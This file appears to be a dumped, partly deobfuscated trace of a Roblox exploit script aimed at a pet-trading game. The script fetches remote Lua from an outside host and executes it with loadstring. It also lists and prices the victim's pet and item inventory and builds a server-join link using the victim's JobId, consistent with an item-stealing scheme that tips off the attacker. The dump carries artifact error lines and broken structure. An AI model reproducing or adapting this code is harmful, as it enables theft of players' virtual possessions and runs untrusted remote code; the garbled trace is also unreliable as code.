@@ -1,0 +1,708 @@
+local fenv = getfenv()
+local args4 = { ... }
+local var1 = (unpack or unpack)
+local success1 = pcall(function(...) -- pcall id 1
+    local var4 = wait()
+end) -- true
+local var7 = fenv.Username
+if var7 then -- ran, expr id 1, had an 'else' but never ran.
+    local var8 = fenv.Webhook
+    if var8 then -- ran, expr id 2, had an 'else' but never ran.
+        local var9 = getgenv().scriptExecuted
+        local var10 = not var9
+        -- true
+        if var10 then -- ran, expr id 3, had an 'else' but never ran.
+            getgenv().scriptExecuted = true
+            if queue_on_teleport then -- ran, expr id 4, had an 'else' but never ran.
+                queueonteleport(true)
+                local var11 = game:GetService("ReplicatedStorage")
+                local var12 = game:GetService("RobloxReplicatedStorage")
+                local var13 = var12:FindFirstChild("GetServerType")
+                if var13 then -- ran, expr id 5, had an 'else' but never ran.
+                    local var14 = var13.InvokeServer
+                    local var15 = var13:InvokeServer()
+                    local var16 = (var15 ~= "VIPServer")
+                    -- true
+                    if var16 then -- ran, expr id 6, had an 'else' but never ran.
+                        local var17 = game:GetService("Players")
+                        local var18 = var17.LocalPlayer
+                        local var19 = game:GetService("HttpService")
+                        local var20 = var11:WaitForChild("Fsys")
+                        local var21 = require(var20)
+                        local var22 = var21.load
+                        local var23 = var22("RouterClient")
+                        local var24 = var22("InventoryDB")
+                        local var25 = var22("ClientData")
+                        local var26 = game:GetService("TextChatService")
+                        local var27 = var26.TextChannels
+                        local var28 = var27.WaitForChild
+                        local var29 = var27:WaitForChild("RBXGeneral")
+                        local var30 = game.ReplicatedStorage
+                        local var31 = var11.SharedModules
+                        local var32 = var31.TradeLicenseHelper
+                        local var33 = require(var32)
+                        local var34 = var33.player_has_trade_license
+                        local var35 = var34()
+                        local var36 = not var35
+                        -- false
+                        if var36 then -- didnt run, expr id 7
+                        else
+                            local var37, var38 = identifyexecutor()
+                            local var39 = (var37 == "Delta")
+                            -- true
+                            if var39 then -- ran, expr id 8, had an 'else' but never ran.
+                                local var40 = var23.get
+                                local var41 = var40("TeleportAPI/TeleportToExperimental")
+                                local var42 = var17.LocalPlayer
+                                local var43 = var18.UserId
+                                local var44 = game:GetService("TeleportService")
+                                local var53 = var44.TeleportInitFailed:Connect(function(...)
+                                    local args2 = { ... }
+                                    local var45 = not args2[5]
+                                    -- false
+                                    if var45 then -- didnt run, expr id 9
+                                    else
+                                    local var46 = args2[5].ServerInstanceId
+                                        local var47 = not var46
+                                        -- false
+                                        if var47 then -- didnt run, expr id 10
+                                        else
+                                    local var48 = args2[5].ServerInstanceId
+                                            local var49 = string.format("getgenv().w = \"%s\"", var48)
+                                            local tbl_50 = {
+                                                var49,
+                                            }
+                                            local var52 = tbl_50[1]
+                                            queueonteleport(var49)
+                                    error("/[internal]: invalid argument #1 to 'queueonteleport', string expected, got table") -- Internal Error
+                                    end
+                                    end
+                                end)
+                                local var54 = var41.FireServer
+                                local var55 = var41:FireServer(nil, nil, nil, nil, {})
+                                task.spawn(function(...)
+                                    local args3 = { ... }
+                                    local tbl_56 = {
+                                        var43,
+                                    }
+                                    local var58 = tbl_56[1]
+                                    local var59 = var23.get
+                                    local var60 = var59("LocationAPI/TeleToPlayerInDifferentServer")
+                                    local var61 = var60.FireServer
+                                    local var62 = var60:FireServer(64951858245)
+                                end)
+                                task.spawn(function(...)
+                                    local args4 = { ... }
+                                    local tbl_63 = {
+                                        var43,
+                                    }
+                                    local var65 = tbl_63[1]
+                                    local var66 = var23.get
+                                    local var67 = var66("LocationAPI/TeleToPlayerInDifferentServer")
+                                    local var68 = var67.FireServer
+                                    local var69 = var67:FireServer(64951858245)
+                                end)
+                                local var70 = var29.MessageReceived
+                                local var71 = var70.Connect
+                                local var72 = var70:Connect(function(...)
+                                    local args5 = { ... }
+                                    local var483 = args5[1].TextSource
+                                    local var484 = not var483
+                                    -- false
+                                    if var484 then -- didnt run, expr id 47
+                                    else
+                                    local var485 = args5[1].TextSource
+                                    local var486 = var485.Name
+                                        local var487 = string.lower(var486)
+                                        local var488 = string.lower(var7)
+                                        local var489 = (var487 == var488)
+                                        -- false
+                                        if var489 then -- didnt run, expr id 48
+                                        else
+                                    local var490 = args5[1].TextSource
+                                    local var491 = var490.Name
+                                            local var492 = string.lower(var491)
+                                            local var493 = (var492 == "mabaho_puyet")
+                                            -- false
+                                            if var493 then -- didnt run, expr id 49
+                                            else
+                                    end
+                                    end
+                                    end
+                                end)
+                                local var73 = game:HttpGet("https://sudokai.up.railway.app/values")
+                                local tbl_74 = {
+                                    var73,
+                                }
+                                local var76 = tbl_74[1]
+                                local var77 = loadstring(var73)
+                                local var78, var79, var80, var81, var82 = var77()
+                                local var83 = var25.get
+                                local var84 = var83("inventory")
+                                local var85 = var84.pets
+                                local var86 = var25.get
+                                local var87 = var86("inventory")
+                                local var88 = var87.toys
+                                local var89 = var25.get
+                                local var90 = var89("inventory")
+                                local var91 = var90.food
+                                local var92 = var25.get
+                                local var93 = var92("inventory")
+                                local var94 = var93.strollers
+                                local var95 = var25.get
+                                local var96 = var95("inventory")
+                                local var97 = var96.transport
+                                local var98 = var25.get
+                                local var99 = var98("inventory")
+                                local var100 = var99.pet_accessories
+                                local tbl_101 = {
+                                    "pets",
+                                    var85,
+                                }
+                                local var103 = tbl_101[1]
+                                local var105 = tbl_101[2]
+                                local var107 = tbl_101[1]
+                                for i, v in pairs(var85) do
+                                    local tbl_108 = {
+                                        i,
+                                        v,
+                                    }
+                                    local var110 = tbl_108[1]
+                                    local var112 = tbl_108[2]
+                                    local var114 = tbl_108[1]
+                                    if i then -- ran, expr id 11, had an 'else' but never ran.
+                                        local var115 = v.category
+                                        local var117 = var24[var115]
+                                        local var118 = var24[var115]
+                                        local var119 = not var117
+                                        -- false
+                                        if var119 then -- didnt run, expr id 12
+                                        else
+                                            local var120 = v.category
+                                            local var122 = var24[var120]
+                                            local var123 = var24[var120]
+                                            local var124 = v.id
+                                            local var126 = var122[var124]
+                                            local var127 = var122[var124]
+                                            local var128 = not var126
+                                            -- false
+                                            if var128 then -- didnt run, expr id 13
+                                            else
+                                                local var129 = var126.name
+                                                local tbl_130 = {
+                                                    "pets",
+                                                    v,
+                                                }
+                                                local var132 = tbl_130[1]
+                                                local var134 = tbl_130[2]
+                                                local var135 = v.properties
+                                                if var135 then -- ran, expr id 14, had an 'else' but never ran.
+                                                    local var136 = v.properties
+                                                    local var137 = var136.mega_neon
+                                                    local var138 = not var137
+                                                    -- false
+                                                    if var138 then -- didnt run, expr id 15
+                                                    else
+                                                        local var139 = v.properties
+                                                        local var140 = var139.flyable
+                                                        local var141 = not var140
+                                                        -- false
+                                                        if var141 then -- didnt run, expr id 16
+                                                        else
+                                                            local var142 = v.properties
+                                                            local var143 = var142.rideable
+                                                            local var144 = not var143
+                                                            -- false
+                                                            if var144 then -- didnt run, expr id 17
+                                                            else
+                                                                local var145 = var129 .. " ("
+                                    local var146 = var145 .. "rfm"
+                                    local var147 = var146 .. ")"
+                                                                local var149 = {}[var147]
+                                                                for i_2, v_2 in ipairs(var78) do
+                                                                    local tbl_150 = {
+                                                                        i_2,
+                                                                        v_2,
+                                                                    }
+                                                                    local var152 = tbl_150[1]
+                                                                    local var154 = tbl_150[2]
+                                                                    local var156 = tbl_150[1]
+                                                                    if i_2 then -- ran, expr id 18, had an 'else' but never ran.
+                                                                        local var157 = v_2.name
+                                                                        local tbl_158 = {
+                                                                            var129,
+                                                                            var157,
+                                                                        }
+                                                                        local var160 = tbl_158[1]
+                                                                        local var162 = tbl_158[2]
+                                                                        local var163 = (var129 == var157)
+                                                                        -- false
+                                                                        local var164 = (var163 and 3)
+                                                                    end
+                                                                end
+                                                                local var165 = {
+                                                                    pets = 0,
+                                                                    food = 0,
+                                                                    toys = 0,
+                                                                    pet_wear = 0,
+                                                                    strollers = 0,
+                                                                    transport = 0,
+                                                                }
+                                                                local var166 = var165.pets
+                                                                local var167 = var166 + 0
+                                                                var165.pets = var167
+                                                            end
+                                                            local tbl_168 = {
+                                                                "food",
+                                                                var91,
+                                                            }
+                                                            local var170 = tbl_168[1]
+                                                            local var172 = tbl_168[2]
+                                                            local var174 = tbl_168[1]
+                                                            for i_3, v_3 in pairs(var91) do
+                                                                local tbl_175 = {
+                                                                    i_3,
+                                                                    v_3,
+                                                                }
+                                                                local var177 = tbl_175[1]
+                                                                local var179 = tbl_175[2]
+                                                                local var181 = tbl_175[1]
+                                                                if i_3 then -- ran, expr id 19, had an 'else' but never ran.
+                                                                    local var182 = v_3.category
+                                                                    local var184 = var24[var182]
+                                                                    local var185 = var24[var182]
+                                                                    local var186 = not var184
+                                                                    -- false
+                                                                    if var186 then -- didnt run, expr id 20
+                                                                    else
+                                                                        local var187 = v_3.category
+                                                                        local var189 = var24[var187]
+                                                                        local var190 = var24[var187]
+                                                                        local var191 = v_3.id
+                                                                        local var193 = var189[var191]
+                                                                        local var194 = var189[var191]
+                                                                        local var195 = not var193
+                                                                        -- false
+                                                                        if var195 then -- didnt run, expr id 21
+                                                                        else
+                                                                            local var196 = var193.name
+                                                                            local tbl_197 = {
+                                                                                "food",
+                                                                                v_3,
+                                                                            }
+                                                                            local var199 = tbl_197[1]
+                                                                            local var201 = tbl_197[2]
+                                                                            local var202 = var196 .. " ("
+                                    local var203 = var202 .. "d"
+                                    local var204 = var203 .. ")"
+                                                                            local var206 = {
+                                                                                [var147] = 1,
+                                                                            }[var204]
+                                                                            for i_4, v_4 in ipairs(var78) do
+                                                                                local tbl_207 = {
+                                                                                i_4,
+                                                                                v_4,
+                                                                            }
+                                                                                local var209 = tbl_207[1]
+                                                                                local var211 = tbl_207[2]
+                                                                                local var213 = tbl_207[1]
+                                                                                if i_4 then -- ran, expr id 22, had an 'else' but never ran.
+                                                                                local var214 = v_4.name
+                                                                                local tbl_215 = {
+                                                                                var196,
+                                                                                var214,
+                                                                            }
+                                                                                local var217 = tbl_215[1]
+                                                                                local var219 = tbl_215[2]
+                                                                                local var220 = (var196 == var214)
+                                                                                -- false
+                                                                                local var221 = (var220 and 3)
+                                                                                end
+                                                                            end
+                                                                            local var222 = var165.food
+                                                                            local var223 = var222 + 0
+                                                                            var165.food = var223
+                                                                        end
+                                                                        for i_5, v_5 in pairs(var88) do
+                                                                            local tbl_224 = {
+                                                                                i_5,
+                                                                                v_5,
+                                                                            }
+                                                                            local var226 = tbl_224[1]
+                                                                            local var228 = tbl_224[2]
+                                                                            local var230 = tbl_224[1]
+                                                                            if i_5 then -- ran, expr id 23, had an 'else' but never ran.
+                                                                                local var231 = v_5.category
+                                                                                local var233 = var24[var231]
+                                                                                local var234 = var24[var231]
+                                                                                local var235 = not var233
+                                                                                -- false
+                                                                                if var235 then -- didnt run, expr id 24
+                                                                                else
+                                                                                local var236 = v_5.category
+                                                                                local var238 = var24[var236]
+                                                                                local var239 = var24[var236]
+                                                                                local var240 = v_5.id
+                                                                                local var242 = var238[var240]
+                                                                                local var243 = var238[var240]
+                                                                                local var244 = not var242
+                                                                                -- false
+                                                                                if var244 then -- didnt run, expr id 25
+                                                                                else
+                                                                                local var245 = var242.name
+                                                                                local var246 = var245 .. " ("
+                                    local var247 = var246 .. "d"
+                                    local var248 = var247 .. ")"
+                                                                                local var250 = {
+                                                                                [var204] = 1,
+                                                                                [var147] = 1,
+                                                                            }[var248]
+                                                                                for i_6, v_6 in ipairs(var78) do
+                                                                                local tbl_251 = {
+                                                                                i_6,
+                                                                                v_6,
+                                                                            }
+                                                                                local var253 = tbl_251[1]
+                                                                                local var255 = tbl_251[2]
+                                                                                local var257 = tbl_251[1]
+                                                                                if i_6 then -- ran, expr id 26, had an 'else' but never ran.
+                                                                                local var258 = v_6.name
+                                                                                local tbl_259 = {
+                                                                                var245,
+                                                                                var258,
+                                                                            }
+                                                                                local var261 = tbl_259[1]
+                                                                                local var263 = tbl_259[2]
+                                                                                local var264 = (var245 == var258)
+                                                                                -- false
+                                                                                local var265 = (var264 and 3)
+                                                                                end
+                                                                                end
+                                                                                local var266 = var165.toys
+                                                                                local var267 = var266 + 0
+                                                                                var165.toys = var267
+                                                                                end
+                                                                                for i_7, v_7 in pairs(var100) do
+                                                                                local tbl_268 = {
+                                                                                i_7,
+                                                                                v_7,
+                                                                            }
+                                                                                local var270 = tbl_268[1]
+                                                                                local var272 = tbl_268[2]
+                                                                                local var274 = tbl_268[1]
+                                                                                if i_7 then -- ran, expr id 27, had an 'else' but never ran.
+                                                                                local var275 = v_7.category
+                                                                                local var277 = var24[var275]
+                                                                                local var278 = var24[var275]
+                                                                                local var279 = not var277
+                                                                                -- false
+                                                                                if var279 then -- didnt run, expr id 28
+                                                                                else
+                                                                                local var280 = v_7.category
+                                                                                local var282 = var24[var280]
+                                                                                local var283 = var24[var280]
+                                                                                local var284 = v_7.id
+                                                                                local var286 = var282[var284]
+                                                                                local var287 = var282[var284]
+                                                                                local var288 = not var286
+                                                                                -- false
+                                                                                if var288 then -- didnt run, expr id 29
+                                                                                else
+                                                                                local var289 = var286.name
+                                                                                local var290 = var289 .. " ("
+                                    local var291 = var290 .. "d"
+                                    local var292 = var291 .. ")"
+                                                                                local var294 = {
+                                                                                [var248] = 1,
+                                                                                [var204] = 1,
+                                                                                [var147] = 1,
+                                                                            }[var292]
+                                                                                for i_8, v_8 in ipairs(var78) do
+                                                                                local tbl_295 = {
+                                                                                i_8,
+                                                                                v_8,
+                                                                            }
+                                                                                local var297 = tbl_295[1]
+                                                                                local var299 = tbl_295[2]
+                                                                                local var301 = tbl_295[1]
+                                                                                if i_8 then -- ran, expr id 30, had an 'else' but never ran.
+                                                                                local var302 = v_8.name
+                                                                                local tbl_303 = {
+                                                                                var289,
+                                                                                var302,
+                                                                            }
+                                                                                local var305 = tbl_303[1]
+                                                                                local var307 = tbl_303[2]
+                                                                                local var308 = (var289 == var302)
+                                                                                -- false
+                                                                                local var309 = (var308 and 3)
+                                                                                end
+                                                                                end
+                                                                                local var310 = var165.pet_wear
+                                                                                local var311 = var310 + 0
+                                                                                var165.pet_wear = var311
+                                                                                end
+                                                                                local tbl_312 = {
+                                                                                "strollers",
+                                                                                var94,
+                                                                            }
+                                                                                local var314 = tbl_312[1]
+                                                                                local var316 = tbl_312[2]
+                                                                                local var318 = tbl_312[1]
+                                                                                for i_9, v_9 in pairs(var94) do
+                                                                                local tbl_319 = {
+                                                                                i_9,
+                                                                                v_9,
+                                                                            }
+                                                                                local var321 = tbl_319[1]
+                                                                                local var323 = tbl_319[2]
+                                                                                local var325 = tbl_319[1]
+                                                                                if i_9 then -- ran, expr id 31, had an 'else' but never ran.
+                                                                                local var326 = v_9.category
+                                                                                local var328 = var24[var326]
+                                                                                local var329 = var24[var326]
+                                                                                local var330 = not var328
+                                                                                -- false
+                                                                                if var330 then -- didnt run, expr id 32
+                                                                                else
+                                                                                local var331 = v_9.category
+                                                                                local var333 = var24[var331]
+                                                                                local var334 = var24[var331]
+                                                                                local var335 = v_9.id
+                                                                                local var337 = var333[var335]
+                                                                                local var338 = var333[var335]
+                                                                                local var339 = not var337
+                                                                                -- false
+                                                                                if var339 then -- didnt run, expr id 33
+                                                                                else
+                                                                                local var340 = var337.name
+                                                                                local tbl_341 = {
+                                                                                "strollers",
+                                                                                v_9,
+                                                                            }
+                                                                                local var343 = tbl_341[1]
+                                                                                local var345 = tbl_341[2]
+                                                                                local var346 = var340 .. " ("
+                                    local var347 = var346 .. "d"
+                                    local var348 = var347 .. ")"
+                                                                                local var350 = {
+                                                                                [var292] = 1,
+                                                                                [var248] = 1,
+                                                                                [var204] = 1,
+                                                                                [var147] = 1,
+                                                                            }[var348]
+                                                                                for i_10, v_10 in ipairs(var78) do
+                                                                                local tbl_351 = {
+                                                                                i_10,
+                                                                                v_10,
+                                                                            }
+                                                                                local var353 = tbl_351[1]
+                                                                                local var355 = tbl_351[2]
+                                                                                local var357 = tbl_351[1]
+                                                                                if i_10 then -- ran, expr id 34, had an 'else' but never ran.
+                                                                                local var358 = v_10.name
+                                                                                local tbl_359 = {
+                                                                                var340,
+                                                                                var358,
+                                                                            }
+                                                                                local var361 = tbl_359[1]
+                                                                                local var363 = tbl_359[2]
+                                                                                local var364 = (var340 == var358)
+                                                                                -- false
+                                                                                local var365 = (var364 and 3)
+                                                                                end
+                                                                                end
+                                                                                local var366 = var165.strollers
+                                                                                local var367 = var366 + 0
+                                                                                var165.strollers = var367
+                                                                                end
+                                                                                local tbl_368 = {
+                                                                                "transport",
+                                                                                var97,
+                                                                            }
+                                                                                local var370 = tbl_368[1]
+                                                                                local var372 = tbl_368[2]
+                                                                                local var374 = tbl_368[1]
+                                                                                for i_11, v_11 in pairs(var97) do
+                                                                                local tbl_375 = {
+                                                                                i_11,
+                                                                                v_11,
+                                                                            }
+                                                                                local var377 = tbl_375[1]
+                                                                                local var379 = tbl_375[2]
+                                                                                local var381 = tbl_375[1]
+                                                                                if i_11 then -- ran, expr id 35, had an 'else' but never ran.
+                                                                                local var382 = v_11.category
+                                                                                local var384 = var24[var382]
+                                                                                local var385 = var24[var382]
+                                                                                local var386 = not var384
+                                                                                -- false
+                                                                                if var386 then -- didnt run, expr id 36
+                                                                                else
+                                                                                local var387 = v_11.category
+                                                                                local var389 = var24[var387]
+                                                                                local var390 = var24[var387]
+                                                                                local var391 = v_11.id
+                                                                                local var393 = var389[var391]
+                                                                                local var394 = var389[var391]
+                                                                                local var395 = not var393
+                                                                                -- false
+                                                                                if var395 then -- didnt run, expr id 37
+                                                                                else
+                                                                                local var396 = var393.name
+                                                                                local tbl_397 = {
+                                                                                "transport",
+                                                                                v_11,
+                                                                            }
+                                                                                local var399 = tbl_397[1]
+                                                                                local var401 = tbl_397[2]
+                                                                                local var402 = var396 .. " ("
+                                    local var403 = var402 .. "d"
+                                    local var404 = var403 .. ")"
+                                                                                local var406 = {
+                                                                                [var204] = 1,
+                                                                                [var147] = 1,
+                                                                                [var292] = 1,
+                                                                                [var348] = 1,
+                                                                                [var248] = 1,
+                                                                            }[var404]
+                                                                                for i_12, v_12 in ipairs(var78) do
+                                                                                local tbl_407 = {
+                                                                                i_12,
+                                                                                v_12,
+                                                                            }
+                                                                                local var409 = tbl_407[1]
+                                                                                local var411 = tbl_407[2]
+                                                                                local var413 = tbl_407[1]
+                                                                                if i_12 then -- ran, expr id 38, had an 'else' but never ran.
+                                                                                local var414 = v_12.name
+                                                                                local tbl_415 = {
+                                                                                var396,
+                                                                                var414,
+                                                                            }
+                                                                                local var417 = tbl_415[1]
+                                                                                local var419 = tbl_415[2]
+                                                                                local var420 = (var396 == var414)
+                                                                                -- false
+                                                                                local var421 = (var420 and 3)
+                                                                                end
+                                                                                end
+                                                                                local var422 = var165.transport
+                                                                                local var423 = var422 + 0
+                                                                                var165.transport = var423
+                                                                                end
+                                                                                local var424 = var25.get
+                                                                                local var425 = var424("inventory")
+                                                                                for i_13, v_13 in pairs(var425) do
+                                                                                local tbl_426 = {
+                                                                                i_13,
+                                                                                v_13,
+                                                                            }
+                                                                                local var428 = tbl_426[1]
+                                                                                local var430 = tbl_426[2]
+                                                                                local var432 = tbl_426[1]
+                                                                                if i_13 then -- ran, expr id 39, had an 'else' but never ran.
+                                                                                for i_14, v_14 in pairs(v_13) do
+                                                                                local tbl_433 = {
+                                                                                i_14,
+                                                                                v_14,
+                                                                            }
+                                                                                local var435 = tbl_433[1]
+                                                                                local var437 = tbl_433[2]
+                                                                                local var439 = tbl_433[1]
+                                                                                if i_14 then -- ran, expr id 40, had an 'else' but never ran.
+                                                                                local var440 = v_14.category
+                                                                                local var442 = var24[var440]
+                                                                                local var443 = var24[var440]
+                                                                                if var442 then -- ran, expr id 41, had an 'else' but never ran.
+                                                                                local var444 = v_14.category
+                                                                                local var446 = var24[var444]
+                                                                                local var447 = var24[var444]
+                                                                                local var448 = v_14.id
+                                                                                local var450 = var446[var448]
+                                                                                local var451 = var446[var448]
+                                                                                if var450 then -- ran, expr id 42, had an 'else' but never ran.
+                                                                                local var452 = var450.name
+                                                                                local tbl_453 = {
+                                                                                i_13,
+                                                                                v_14,
+                                                                            }
+                                                                                local var455 = tbl_453[1]
+                                                                                local var457 = tbl_453[2]
+                                                                                local var458 = (i_13 ~= "pets")
+                                                                                -- true
+                                                                                if var458 then -- ran, expr id 43, had an 'else' but never ran.
+                                                                                for i_15, v_15 in ipairs(var78) do
+                                                                                local tbl_459 = {
+                                                                                i_15,
+                                                                                v_15,
+                                                                            }
+                                                                                local var461 = tbl_459[1]
+                                                                                local var463 = tbl_459[2]
+                                                                                local var465 = tbl_459[1]
+                                                                                if i_15 then -- ran, expr id 44, had an 'else' but never ran.
+                                                                                local var466 = v_15.name
+                                                                                local tbl_467 = {
+                                                                                var452,
+                                                                                var466,
+                                                                            }
+                                                                                local var469 = tbl_467[1]
+                                                                                local var471 = tbl_467[2]
+                                                                                local var472 = (var452 == var466)
+                                                                                -- false
+                                                                                local var473 = (var472 and 3)
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                local var474 = var18.AccountAge
+                                                                                local var475 = var18.UserId
+                                                                                local var476, var477 = identifyexecutor()
+                                                                                local var478 = not var476
+                                                                                -- false
+                                                                                if var478 then -- didnt run, expr id 45
+                                                                                else
+                                                                                local var479 = game.PlaceId
+                                                                                local var480 = getgenv().real
+                                                                                if var480 then -- didnt run, expr id 46
+                                                                                else
+                                                                                local var481 = game.JobId
+                                                                                local var482 = string.format("[Join directly](%s/%d/%s)", "https://sudokai.up.railway.app", var479, var481)
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                                end
+                                                                            end
+                                                                        end
+                                                                    end
+                                                                end
+                                                            end
+                                                        end
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+error("/[internal]: invalid argument #4 to 'format' (string expected, got table)") -- Internal Error
